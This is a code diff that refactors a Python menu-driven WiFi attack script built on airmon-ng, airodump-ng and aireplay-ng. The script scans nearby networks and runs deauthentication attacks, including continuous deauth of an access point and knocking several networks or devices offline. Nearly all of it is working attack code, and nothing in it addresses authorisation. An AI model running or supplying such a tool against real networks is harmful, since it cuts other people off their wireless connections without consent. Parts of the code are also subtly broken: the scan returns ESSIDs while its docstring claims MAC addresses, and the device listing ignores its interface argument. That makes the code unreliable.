@@ -1,69 +1,89 @@
 import os
 import subprocess
+import csv
+from typing import List
 
-def start_airmon():
-    subprocess.run(["airmon-ng", "start", "wlan0"])
+def start_airmon() -> None:
+    """Start airmon-ng"""
+    try:
+        subprocess.run(["airmon-ng", "start", "wlan0"], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error starting airmon-ng: {e}")
 
-def stop_airmon():
-    subprocess.run(["airmon-ng", "stop", "wlan0mon"])
+def stop_airmon() -> None:
+    """Stop airmon-ng"""
+    try:
+        subprocess.run(["airmon-ng", "stop", "wlan0mon"], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error stopping airmon-ng: {e}")
 
-def get_wifi_list():
-    # Put wlan0 into monitor mode
-    start_airmon()
-    # Get the new interface name (e.g. wlan0mon)
-    output = subprocess.check_output(["airmon-ng"])
-    interface_name = None
-    for line in output.decode("utf-8").split("\n"):
-        if "wlan0" in line:
-            interface_name = line.split()[1]
-            break
-    if interface_name is None:
-        print("Failed to get interface name")
+def get_interface_name() -> str:
+    """Get the interface name (e.g. wlan0mon)"""
+    try:
+        output = subprocess.check_output(["airmon-ng"])
+        for line in output.decode("utf-8").split("\n"):
+            if "wlan0" in line:
+                return line.split()[1]
+        return ""
+    except subprocess.CalledProcessError as e:
+        print(f"Error getting interface name: {e}")
+        return ""
+
+def scan_wifi(interface_name: str) -> List[str]:
+    """Scan for wireless networks and return a list of MAC addresses"""
+    try:
+        subprocess.run(["airodump-ng", "-w", "scan", "--output-format", "csv", interface_name], timeout=10, check=True)
+        with open("scan-01.csv", "r") as f:
+            reader = csv.reader(f)
+            wifi_list = [row[13].strip() for row in reader][1:]  # Skip the header
+        return wifi_list
+    except subprocess.CalledProcessError as e:
+        print(f"Error scanning for WiFi: {e}")
         return []
-    # Scan for wireless networks
-    subprocess.run(["airodump-ng", "-w", "scan", "--output-format", "csv", interface_name], timeout=10)
-    # Read the CSV file
-    with open("scan-01.csv", "r") as f:
-        wifi_list = []
-        for line in f.readlines()[1:]:  # Skip the header
-            wifi_list.append(line.split(",")[13].strip())
-    # Stop airmon-ng
-    stop_airmon()
-    return wifi_list
+    except FileNotFoundError:
+        print("Error: scan-01.csv file not found")
+        return []
 
-def set_channel(channel):
-    subprocess.run(["iwconfig", "wlan0mon", "channel", channel])
+def set_channel(channel: str) -> None:
+    """Set the channel for the interface"""
+    try:
+        subprocess.run(["iwconfig", "wlan0mon", "channel", channel], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error setting channel: {e}")
 
-def deauth_attack(mac_address):
-    # Get the current interface name
-    output = subprocess.check_output(["airmon-ng"])
-    interface_name = None
-    for line in output.decode("utf-8").split("\n"):
-        if "wlan0" in line:
-            interface_name = line.split()[1]
-            break
-    if interface_name is None:
-        print("Failed to get interface name")
-        return
-    # Perform deauth attack
-    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", mac_address, interface_name])
-    
-def get_connected_devices():
-    output = subprocess.check_output(["airodump-ng", "-w", "wlan0", "--output-format", "csv"])
-    devices = []
-    for line in output.decode("utf-8").split("\n"):
-        if "Station" in line:
-            devices.append(line.split(",")[0].strip())
-    return devices
+def deauth_attack(mac_address: str, interface_name: str) -> None:
+    """Perform a deauth attack on a WiFi network"""
+    try:
+        subprocess.run(["aireplay-ng", "--deauth", "0", "-a", mac_address, interface_name], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error performing deauth attack: {e}")
 
-def deauth_specific_device(mac):
-    subprocess.run(["aireplay-ng", "-0", "1", "-a", mac, "wlan0mon"])
+def get_connected_devices(interface_name: str) -> List[str]:
+    """Get a list of connected devices"""
+    try:
+        output = subprocess.check_output(["airodump-ng", "-w", "wlan0", "--output-format", "csv"])
+        devices = [line.split(",")[0].strip() for line in output.decode("utf-8").split("\n") if "Station" in line]
+        return devices
+    except subprocess.CalledProcessError as e:
+        print(f"Error getting connected devices: {e}")
+        return []
 
-def deauth_multiple_wifi(macs):
+def deauth_specific_device(mac: str, interface_name: str) -> None:
+    """Deauthenticate a specific device"""
+    try:
+        subprocess.run(["aireplay-ng", "-0", "1", "-a", mac, interface_name], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error deauthenticating device: {e}")
+
+def deauth_multiple_wifi(macs: List[str], interface_name: str) -> None:
+    """Deauthenticate multiple WiFi networks"""
     for mac in macs:
-        subprocess.run(["aireplay-ng", "-0", "1", "-a", mac, "wlan0mon"])
+        try:
+            subprocess.run(["aireplay-ng", "-0", "1", "-a", mac, interface_name], check=True)
+        except subprocess.CalledProcessError as e:
+            print(f"Error deauthenticating WiFi: {e}")
 
-def main():
+def main() -> None:
     while True:
         print("1. Start airmon-ng")
         print("2. Stop airmon-ng")
@@ -82,10 +102,12 @@ def main():
         elif choice == "2":
             stop_airmon()
         elif choice == "3":
-            wifi_list = get_wifi_list()
-            print("WiFi List:")
-            for i, wifi in enumerate(wifi_list):
-                print(f"{i+1}. {wifi}")
+            interface_name = get_interface_name()
+            if interface_name:
+                wifi_list = scan_wifi(interface_name)
+                print("WiFi List:")
+                for i, wifi in enumerate(wifi_list):
+                    print(f"{i+1}. {wifi}")
         elif choice == "4":
             channel = input("Enter channel number: ")
             set_channel(channel)
